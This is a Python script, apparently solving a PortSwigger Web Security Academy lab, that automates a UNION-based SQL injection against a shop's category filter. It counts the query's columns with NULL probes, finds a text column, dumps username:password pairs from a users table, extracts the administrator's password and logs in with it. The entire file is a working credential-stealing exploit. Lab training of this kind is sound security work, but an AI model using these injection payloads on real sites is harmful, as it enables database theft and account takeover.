# usage:
# python3 6.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str) -> None:
        self.url = url.rstrip("/")
        self.who = who
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        s = requests.Session()

        i = 1
        r = s.get(f"{self.url}/filter?category=Gifts'+UNION+SELECT+NULL--")
        while r.status_code == 500:
            i += 1
            nulls = ["NULL"] * i
            r = s.get(
                f"{self.url}/filter?category=Gifts'+UNION+SELECT+{','.join(nulls)}--"
            )

        for j in range(i):
            nulls = ["NULL"] * i
            nulls[j] = "a"
            r = s.get(
                f"{self.url}/filter?category=Gifts'+UNION+SELECT+{','.join(nulls)}--"
            )
            if r.status_code != 500:
                break

        nulls = ["NULL"] * i
        nulls[j] = "CONCAT(username,':',password)"
        r = s.get(
            f"{self.url}/filter?category=Gifts'+UNION+SELECT+{','.join(nulls)}+FROM+users--"
        )
        password = re.findall(r"administrator:([\w]+)", r.text)[0]
        r = self.login(self.who, password)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    s = Solution(args.url, args.who)
    s.solve()


if __name__ == "__main__":
    main()
